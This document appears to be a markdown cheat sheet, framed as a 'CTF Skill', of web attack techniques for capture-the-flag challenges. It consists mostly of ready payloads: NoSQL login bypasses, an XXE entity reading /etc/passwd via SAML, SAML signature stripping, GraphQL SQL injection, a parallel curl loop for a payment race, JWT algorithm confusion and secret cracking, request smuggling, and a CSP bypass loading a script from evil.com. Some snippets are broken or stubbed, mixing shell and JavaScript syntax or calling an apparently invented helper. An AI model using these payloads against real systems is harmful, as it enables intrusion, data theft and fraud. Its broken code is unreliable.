# CTF Skill: Web Challenges Deep Dive

## Purpose
Advanced techniques for web-based CTF challenges.

## NoSQL Injection

### MongoDB
```javascript
# Basic injection
{"$ne": null}
{"$gt": ""}
{"$regex": "^admin.*"}

# Login bypass
username[$ne]=admin&password[$ne]=null
username=admin&password[$regex]=.*

# Extract data
username[$regex]=^a&password[$ne]=null
```

### MongoDB Operators
```javascript
$eq      // Equal
$ne      // Not equal
$gt      // Greater than
$lt      // Less than
$regex   // Regular expression
$exists  // Field exists
$type    // Field type
$where   // JavaScript
```

## GraphQL

### Introspection
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}
```

### Queries
```graphql
# List all fields
{ __type(name: "User") { fields { name type { name } } } }

# Query data
query { user(id: "1") { name email } }

# Introspection bypass
{ "query": "{__schema{types{name}}}" }
```

### Mutations
```graphql
mutation {
  login(username: "admin", password: "admin") {
    token
  }
}
```

## SAML

### XXE in SAML
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<samlp:Response>
  <ds:Signature>
    <ds:Reference>
      <ds:DigestValue>&xxe;</ds:DigestValue>
    </ds:Reference>
  </ds:Signature>
</samlp:Response>
```

### Signature Bypass
```xml
# Remove signature
<samlp:Response>
  <!-- signature removed -->
</samlp:Response>

# Or inject additional assertion
```

## GraphQL SQL Injection
```graphql
# Error-based
{ user(id: "1' AND 1=1 --") { name } }

# UNION-based
{ user(id: "1' UNION SELECT NULL--") { name } }
```

## Race Conditions in Web

### Burp Turbo Intruder
```python
# Turbo Intruder script
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=5)
    
    for i in range(10):
        engine.queue(target.req, lambda res: print(res))
        
    engine.start()

def handleResponse(req, interesting):
    if 'flag' in req.response:
        addToHighlight(req.response)
```

### Concurrent Payments
```bash
# Race condition to get discount twice
for i in {1..10}; do
  curl -X POST -b "session=xxx" \
    https://target/api/purchase &
done
```

## Prototype Pollution

### Node.js
```javascript
// Basic pollute
{"__proto__": {"admin": true}}

// Chain pollute  
{"constructor": {"prototype": {"polluted": "yes"}}}

// Exploitation
obj.isAdmin  // Returns true after pollution
```

### Merge Objects
```javascript
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      target[key] = merge(target[key] || {}, source[key])
    } else {
      target[key] = source[key]
    }
  }
  return target
}
```

## JWT Vulnerabilities

### Algorithm Confusion
```javascript
// RS256 to HS256
// Use public key as HMAC secret
header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "1234567890", "name": "John", "admin": true}

// Sign with RSA public key
import jwt from 'jsonwebtoken'
jwt.sign(payload, publicKey, {algorithm: 'HS256'})
```

### Key Confusion Attack
```python
import hmac
import hashlib
import base64

# Use RSA public key as HMAC secret
public_key = open('public.pem').read()
payload = base64.b64decode(jwt.split('.')[1])
signature = hmac.new(public_key, jwt_header + '.' + payload, hashlib.sha256)

# Create forged token
```

### Weak Keys
```python
# Bruteforce with john
# HS256 with common secret
jwt_breaker('token.txt', 'rockyou.txt')

# Tools
python3 jwt_tool.py <JWT> -C -d wordlist.txt
```

## WebSocket Attacks

### Origin Bypass
```javascript
# WebSocket connection
new WebSocket('ws://target.com/path', {
  headers: { 'Origin': 'https://trusted.com' }
})
```

### WebSocket Hijacking
```javascript
// CSRF via WebSocket
var ws = new WebSocket('ws://target.com')
ws.onopen = function() {
  ws.send('authenticated request')
}
```

## Race Conditions

### Timeouts
```python
# Race window between check and use
# Example: password reset token
# Generate -> Use (race in between)

# Burp Suite Macros
# Use macro to capture token in response
```

## HTTP/2 Attacks

### HPACK Smuggling
```python
# HPACK table manipulation
# Overwrite existing entries
# Smuggle headers
```

### Request Smuggling
```python
# CL.TE
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

A

# TE.CL
POST / HTTP/1.1
Host: target.com
Content-Length: 5
Transfer-Encoding: chunked

0

A
```

## CSP Bypass

### Script Gadgets
```html
<!-- Bypassing with existing script-like content -->
<div data-remote-csp="
  <script src='https://evil.com/steal.js'>
">
```

### JSONP
```javascript
// JSONP callback
https://target.com/api?callback=alert(1)//

# Use in CSP
<meta http-equiv="Content-Security-Policy" 
      content="script-src 'unsafe-inline' https://target.com">
```

## Cache Attacks

### Cache Deception
```python
# Cache confusion
https://target.com/noexisting.css
# Server thinks it's a static file
# Attacker controls content

# Web Cache Deception Attack
https://target.com/user/account
# Append .css, server serves HTML
```

## Checklist
```
[ ] Test all parameters
[ ] Check authentication
[ ] Test for SSRF/LFI/RFI
[ ] Look for XXE
[ ] Test NoSQL injection
[ ] Check GraphQL
[ ] Analyze JWT
[ ] Test race conditions
[ ] Look for prototype pollution
[ ] Check CSP
```
